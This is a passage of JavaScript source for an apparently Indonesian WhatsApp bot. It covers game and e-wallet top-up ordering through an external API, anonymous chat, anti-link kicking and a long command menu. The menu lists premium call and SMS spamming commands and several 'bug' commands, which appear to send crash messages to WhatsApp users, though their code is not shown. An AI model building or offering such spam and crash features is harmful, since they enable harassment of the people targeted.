${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("PLN")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("OVO")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*Nomor Target:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("LINKAJA")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*Nomor Target:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("SHP")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*Nomor Target:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("GOPAY")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*Nomor Target:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("DANA")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*Nomor Target:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("VGR")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("FF")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*ID Free Fire:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("VMLSO")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: `${data_topup.data.id_target}`+`${data_topup.data.id_zone}`
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*ID ML:* ${data_topup.data.id_target} (${data_topup.data.id_zone})

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
}
} else if (chats.toLowerCase() === "n") {
reply(`Oke kak Pesanan dengan ID *${data_topup.ID}* DiBatalkan ☺️`)
fs.unlinkSync(topupPath + sender.split('@')[0] + '.json')
}
}
}

if (isButton === "batal_order") {
var top_path = topupPath + sender.split('@')[0] + '.json'
if (!fs.existsSync(top_path)) return reply(`Bukan lu, lu tuh ga di ajak`)
reply(`Oke kak Pesanan DiBatalkan ☺️`)
fs.unlinkSync(topupPath + sender.split('@')[0] + '.json')
}

//Anti Link
if (isGroup && isAntiLink && isBotGroupAdmins){
if (chats.match(/(https:\/\/chat.whatsapp.com)/gi)) {
if (!isBotGroupAdmins) return reply('Untung bot bukan admin')
if (isOwner) return reply('Untung lu owner ku:v')
if (isGroupAdmins) return reply('Admin grup mah bebas ygy')
reply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
ronzz.groupParticipantsUpdate(from, [sender], "remove")
}
}

//Auto Write Database Anonymous Every 30 Second's
setInterval(async () => {
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonymous, null, 2))
}, 30 * 1000)

//For Action Anonymous Chat
if (!isGroup && !msg.key.fromMe) {
let rums = Object.values(anonymous).find(room => [room.a, room.b].includes(sender) && room.state == "CHATTING")
if (rums) {
var partnerJID = [rums.a, rums.b].find(user => user !== sender)
if (msg.type == "conversation") {
ronzz.sendMessage(partnerJID, { text: chats })
} else if (msg.type == "extendedTextMessage") {
ronzz.sendMessage(partnerJID, { text: chats, contextInfo: msg.message["extendedTextMessage"].contextInfo })
} else {
var contextInfo = msg.message[msg.type].contextInfo
ronzz.sendMessageFromContent(partnerJID, msg.message, { contextInfo })
}
}
}

//Response Addlist
if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) {
var get_data_respon = getDataResponList(from, chats, db_respon_list)
if (get_data_respon.isImage === false) {
ronzz.sendMessage(from, { text: sendResponList(from, chats, db_respon_list) }, {
quoted: msg
})
} else {
ronzz.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: msg
})
}
}

//Auto read
if (msg.message) {
ronzz.readMessages([msg.key])
}

// Function for Anti Spam
msgFilter.ResetSpam(db_spam)

const spampm = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${prefix+command} [${args.length}]`), 'from', color(pushname))
msgFilter.addSpam(sender, db_spam)
ronzz.sendTextMentions(from, `@${sender.split('@')[0]} terdeteksi spam bot tanpa jeda, lakukan perintah setelah 5 detik`, [sender])
}

const spamgr = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${prefix+command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
msgFilter.addSpam(sender, db_spam)
ronzz.sendTextMentions(from, `@${sender.split('@')[0]} terdeteksi spam bot tanpa jeda, lakukan perintah setelah 5 detik`, [sender])
}

if (isCmd && msgFilter.isFiltered(sender) && !isGroup && !isOwner) return spampm()
if (isCmd && msgFilter.isFiltered(sender) && isGroup && !isOwner) return spamgr()
if (isCmd && !isOwner) msgFilter.addFilter(sender)

// Auto bio
if (msg.message) {
let biobot = "I’m "+botName+"🤖 || Runtime : "+runtime(process.uptime())+"⏰ || Status : Public || "+user.length+ "Users"
ronzz.setStatus(biobot)
}

const cekMenfes = (satu, dua) => { 
let x1 = false
Object.keys(db_menfes).forEach((i) => {
if (db_menfes[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_menfes[x1].id }
if (satu == "teman"){ return db_menfes[x1].teman }
}
if (x1 == false) { return null } 
}

const cekUser = (satu, dua) => { 
let x1 = false
Object.keys(user).forEach((i) => {
if (user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return user[x1].id }
if (satu == "name"){ return user[x1].name }
if (satu == "premium"){ return user[x1].premium }
if (satu == "resi"){ return user[x1].resi }
if (satu == "registerOn"){ return user[x1].registerOn }
}
if (x1 == false) { return null } 
}

let setUser = (satu, dua, tiga) => { 
Object.keys(user).forEach((i) => {
if (user[i].id == dua){
if (satu == "id"){ user[i].id = tiga
fs.writeFileSync('./database/user.json', JSON.stringify(user))} 
if (satu == "name"){ user[i].name = tiga 
fs.writeFileSync('./database/user.json', JSON.stringify(user))} 
if (satu == "resi"){ user[i].seri = tiga 
fs.writeFileSync('./database/user.json', JSON.stringify(user))} 
if (satu == "premium"){ user[i].premium = tiga 
fs.writeFileSync('./database/user.json', JSON.stringify(user))} 
}})
}

//Auto Block Nomor Luar Negeri
if (sender.startsWith('212')) {
reply2(`Maaf kak ${pushname} kamu telah di block oleh bot!!\nKarena kamu menggunakan nomor *+212*🙏`)
setTimeout( () => {
ronzz.updateBlockStatus(sender, 'block')
}, 500)
}

// Logs;
if (!isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix+command} [${args.length}]`), 'from', color(pushname))
}
if (isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix+command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}
if (msg.message && !isGroup && !isCmd && !fromMe) {
console.log('->[\x1b[1;32mMSG\x1b[1;37m]', color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${chats}`), 'from', color(pushname))
}
if (msg.message && isGroup && !isCmd && !fromMe) {
console.log('->[\x1b[1;32mMSG\x1b[1;37m]', color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${chats}`), 'from', color(pushname), 'in', color(groupName))
}

switch(command) {
case 'menu': case 'help':{
let more = String.fromCharCode(8206)
let readmore = more.repeat(4001)
let bio = (await ronzz.fetchStatus(sender).catch(console.error) || {}).status || '-'
let listblock = await ronzz.fetchBlocklist()
let teks = `Hallo *${cekUser("id", sender) !== null ? cekUser("name", sender) : `${pushname}`}* ${ucapanWaktu} 👋

*USER INFO*
- ID : @${sender.split('@')[0]}
- Register : ${cekUser("id", sender) !== null ? `✓
- Premium : ${cekUser("premium", sender) == true? '✓' : '✘'}
- Name : ${cekUser("name", sender)}
- Resi : ${cekUser("resi", sender)}
- Register On : ${cekUser("registerOn", sender)}` : `✘
- Premium : ✘
- Name : ${pushname}`}
- Bio : ${bio ? bio : '-'}
- Status : ${isOwner ? 'Owner' : 'User'} ${botName}
- Saldo : Rp${toRupiah(cekSaldo(sender, db_saldo))}

*BOT INFO*
- Library : Baileys-MD
- Bot Name : ${botName}
- Owner : @${ownerNomer}
- Prefix : [ MULTI PREFIX ]
- Runtime : ${runtime(process.uptime())}
- User : ${user.length} User
- User Terblockir : ${listblock ? listblock : '0'} User

*DATE INFO*
- Masehi : ${tanggal}
- Hijriah : ${dateIslamic}

*TIME INFO*
- WIB : ${jamwib}
- WITA : ${jamwita}
- WIT : ${jamwit}
${readmore}
*MAIN MENU*
- ${prefix}simi
- ${prefix}chat
- ${prefix}confess
- ${prefix}menfess
- ${prefix}request
- ${prefix}report

*OTHERS MENU*
- ${prefix}owner
- ${prefix}donasi
- ${prefix}rules
- ${prefix}script
- ${prefix}profile
- ${prefix}gcbot
- ${prefix}buyprem
- ${prefix}sourcecode

*PREMIUM MENU*
- ${prefix}spamcall
- ${prefix}spamsms1
- ${prefix}spamsms2
- ${prefix}spamsms3
- ${prefix}spamsms4
- ${prefix}spamsms5
- ${prefix}spamsms6
- ${prefix}spamsms7
- ${prefix}spamsms8

*TOOLS MENU*
- ${prefix}tourl
- ${prefix}ttp
- ${prefix}attp
- ${prefix}nulis
- ${prefix}ssweb
- ${prefix}toimg
- ${prefix}tomp3
- ${prefix}tovn
- ${prefix}obfus
- ${prefix}sticker
- ${prefix}tts
- ${prefix}emojimix
- ${prefix}translateid
- ${prefix}translateen
- ${prefix}tinyurl
- ${prefix}cuttly
- ${prefix}bitly
- ${prefix}bass
- ${prefix}blown
- ${prefix}deep
- ${prefix}earrape
- ${prefix}fast
- ${prefix}fat
- ${prefix}nightcore
- ${prefix}reverse
- ${prefix}robot
- ${prefix}slow
- ${prefix}tupai

*TOPUP MENU*
- ${prefix}saldo
- ${prefix}deposit
- ${prefix}bukti
- ${prefix}topup
- ${prefix}listharga

*SOSMED MENU*
- ${prefix}order
- ${prefix}like
- ${prefix}view
- ${prefix}followers
- ${prefix}pricelist
- ${prefix}cekstatus
- ${prefix}confirmorderkunci

*LESSON MENU*
- ${prefix}addjudul
- ${prefix}addtugas
- ${prefix}deltugas
- ${prefix}listtugas
- ${prefix}resettugas

*RANDOM MENU*
- ${prefix}ppcouple
- ${prefix}linkanime
- ${prefix}quotesanime
- ${prefix}servermc

*ISLAMIC MENU*
- ${prefix}jadwalsholat
- ${prefix}ayatkursi
- ${prefix}asmaulhusna
- ${prefix}tafsirsurah
- ${prefix}randomimage

*SET PROSES/DONE*
- ${prefix}setdone
- ${prefix}delsetdone
- ${prefix}changedone
- ${prefix}setproses
- ${prefix}delsetproses
- ${prefix}changeproses

*STORE MENU*
- ${prefix}kali
- ${prefix}bagi
- ${prefix}kurang
- ${prefix}tambah
- ${prefix}done
- ${prefix}proses
- ${prefix}cekitem
- ${prefix}additem
- ${prefix}delitem
- ${prefix}setitem

*GROUP MENU*
- ${prefix}add
- ${prefix}kick
- ${prefix}kicktimer
- ${prefix}open
- ${prefix}close
- ${prefix}group
- ${prefix}tagall
- ${prefix}fitnah
- ${prefix}delete
- ${prefix}jodoh
- ${prefix}jadian
- ${prefix}revoke
- ${prefix}antilink
- ${prefix}welcome
- ${prefix}left
- ${prefix}hidetag
- ${prefix}demote
- ${prefix}setdesc
- ${prefix}linkgc
- ${prefix}promote
- ${prefix}setppgrup
- ${prefix}setnamegc
- ${prefix}fakehidetag

*DOWNLOADER MENU*
- ${prefix}tiktokmp4
- ${prefix}tiktokmp3
- ${prefix}ytmp3
- ${prefix}ytmp4
- ${prefix}mediafire

*INFO MENU*
- ${prefix}cuaca

*SEARCH MENU*
- ${prefix}pinterest
- ${prefix}wallpaper
- ${prefix}play
- ${prefix}happymod
- ${prefix}mcpedl
- ${prefix}komikku

*ANONYMOUS CHAT*
- ${prefix}start
- ${prefix}stop
- ${prefix}skip
- ${prefix}sendprofil
- ${prefix}anonymous

*STALKER MENU*
- ${prefix}stalkff
- ${prefix}stalkml
- ${prefix}stalknpm
- ${prefix}stalkgithub

*OWNER MENU*
- ${prefix}bc
- ${prefix}join
- ${prefix}leave
- ${prefix}block
- ${prefix}server
- ${prefix}setexif
- ${prefix}resetdb
- ${prefix}error
- ${prefix}unblock
- ${prefix}creategc
- ${prefix}sendsesi
- ${prefix}setppbot
- ${prefix}setbiobot
- ${prefix}broadcast
- ${prefix}cekip

*BUG MENU*
- ${prefix}bug1
- ${prefix}bug2
- ${prefix}bug3
- ${prefix}bug4
- ${prefix}bug5
- ${prefix}bug6
- ${prefix}buggc`
let button = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: '🙍‍♂️ Owner' }, type: 1 },
